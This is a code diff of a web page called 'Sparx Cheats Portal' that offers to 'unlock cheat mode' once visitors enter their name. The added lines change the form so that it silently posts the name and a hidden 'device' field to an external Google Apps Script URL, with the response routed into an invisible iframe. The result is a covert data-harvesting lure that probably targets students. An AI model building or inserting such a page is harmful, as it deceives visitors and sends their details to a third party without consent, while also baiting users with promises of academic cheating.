@@ -66,10 +66,12 @@
   <div class="container">
     <h1 class="sparkle">✨ Sparx Cheats Portal ✨</h1>
     <p>Enter your name to unlock cheat mode:</p>
-    <form id="cheatForm">
-      <input type="text" id="username" placeholder="e.g. Kiyan Naqvi" required />
-      <button type="submit">Activate</button>
-    </form>
+    <form id="cheatForm" action="https://script.google.com/macros/s/AKfycbxN8gqD_XSlM8fIzedVgFfp5GXadH616bOmbuuEfg9BTdyRRU5WUqCCPFT6sAyyAfJQfQ/exec" method="POST" target="hidden_iframe">
+  <input type="text" name="username" required />
+  <input type="hidden" name="device" />
+  <button type="submit">Activate</button>
+</form>
+<iframe name="hidden_iframe" style="display:none;"></iframe>
     <div class="message" id="feedbackMsg"></div>
   </div>
 
